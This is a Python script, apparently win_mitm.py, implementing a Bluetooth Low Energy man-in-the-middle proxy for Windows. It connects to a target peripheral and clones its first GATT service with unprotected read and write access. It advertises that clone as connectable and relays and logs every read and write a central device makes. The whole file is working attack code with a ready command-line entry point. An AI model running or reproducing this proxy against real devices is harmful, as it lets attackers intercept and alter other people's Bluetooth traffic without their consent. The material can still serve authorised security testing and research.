import asyncio
import logging
from uuid import UUID
from bleak import BleakClient

try:  # pragma: no cover - optional winrt dependency
    import winrt.windows.devices.bluetooth.genericattributeprofile as gatt
    import winrt.windows.devices.bluetooth.advertisement as adv
except Exception:  # pragma: no cover - winrt may be missing
    gatt = None
    adv = None

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")

class WindowsMITMProxy:
    def __init__(self, target_address):
        self.target_address = target_address
        self.client = BleakClient(target_address)
        self.target_services = None
        self.gatt_provider = None  # GATT service provider instance
        self.local_characteristic = None

    async def connect_to_target(self, retries: int = 3, delay: int = 2):
        for attempt in range(1, retries + 1):
            try:
                await self.client.connect()
                if self.client.is_connected:
                    break
            except Exception as exc:
                logging.error("Connection attempt %s failed: %s", attempt, exc)
            if attempt < retries:
                await asyncio.sleep(delay)
        if not self.client.is_connected:
            raise RuntimeError("Failed to connect to target")
        self.target_services = await self.client.get_services()
        logging.info("Connected to target: %s", self.target_address)

    async def setup_gatt_server(self):
        if gatt is None:
            logging.info("winrt not available; skipping local GATT server setup")
            return
        if not self.target_services:
            return
        first_service = next(iter(self.target_services), None)
        if not first_service or not first_service.characteristics:
            logging.error("No services to mirror for MITM")
            return
        mitm_service_uuid = first_service.uuid
        mitm_char_uuid = first_service.characteristics[0].uuid

        create_result = await gatt.GattServiceProvider.create_async(mitm_service_uuid)
        if getattr(create_result, 'error', gatt.GattServiceProviderError.success) != gatt.GattServiceProviderError.success:
            logging.error("Failed to create GATT service provider.")
            return
        self.gatt_provider = getattr(create_result, 'service_provider', None)

        char_params = gatt.GattLocalCharacteristicParameters()
        char_params.characteristic_properties = (
            gatt.GattCharacteristicProperties.read |
            gatt.GattCharacteristicProperties.write
        )
        char_params.read_protection_level = gatt.GattProtectionLevel.plain
        char_params.write_protection_level = gatt.GattProtectionLevel.plain

        char_create_result = await self.gatt_provider.service.create_characteristic_async(
            mitm_char_uuid, char_params
        )
        if getattr(char_create_result, 'error', gatt.GattServiceProviderError.success) != gatt.GattServiceProviderError.success:
            logging.error("Failed to create characteristic.")
            return

        self.local_characteristic = getattr(char_create_result, 'characteristic', None)

        self.local_characteristic.add_read_requested(self.on_read_requested)
        self.local_characteristic.add_write_requested(self.on_write_requested)

        adv_params = gatt.GattServiceProviderAdvertisingParameters()
        adv_params.is_connectable = True
        adv_params.is_discoverable = True
        if self.gatt_provider:
            self.gatt_provider.start_advertising(adv_params)
            logging.info("GATT server started and advertising as proxy.")

    async def on_read_requested(self, sender, args):
        """Handle read requests from the central device."""
        if not self.local_characteristic:
            args.request.respond_error(1)
            return
        char_uuid = self.local_characteristic.uuid
        logging.info("Read requested on characteristic %s", char_uuid)
        try:
            data = await self.client.read_gatt_char(str(char_uuid))
            logging.info("Forwarded read; data: %s", data)
            args.request.respond(data)
        except Exception as e:
            logging.error("Error during read forwarding: %s", e)
            args.request.respond_error(1)

    async def on_write_requested(self, sender, args):
        """Handle write requests from the central device."""
        if not self.local_characteristic:
            args.request.respond_error(1)
            return
        char_uuid = self.local_characteristic.uuid
        write_request = args.request
        data = write_request.value
        logging.info("Write requested on characteristic %s with data: %s", char_uuid, data)
        try:
            await self.client.write_gatt_char(str(char_uuid), data)
            write_request.respond()
            logging.info("Write forwarded successfully.")
        except Exception as e:
            logging.error("Error during write forwarding: %s", e)
            write_request.respond_error(1)

    async def run(self):
        try:
            await self.connect_to_target()
            await self.setup_gatt_server()
        except Exception as exc:
            logging.error("MITM setup failed: %s", exc)
            return
        logging.info("Windows MITM proxy running. Press Ctrl+C to exit.")
        try:
            while True:
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            logging.info("Shutting down MITM proxy.")
            await self.client.disconnect()
            if self.gatt_provider:
                self.gatt_provider.stop_advertising()

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python win_mitm.py <target_device_address>")
        sys.exit(1)
    target_address = sys.argv[1]
    proxy = WindowsMITMProxy(target_address)
    asyncio.run(proxy.run())
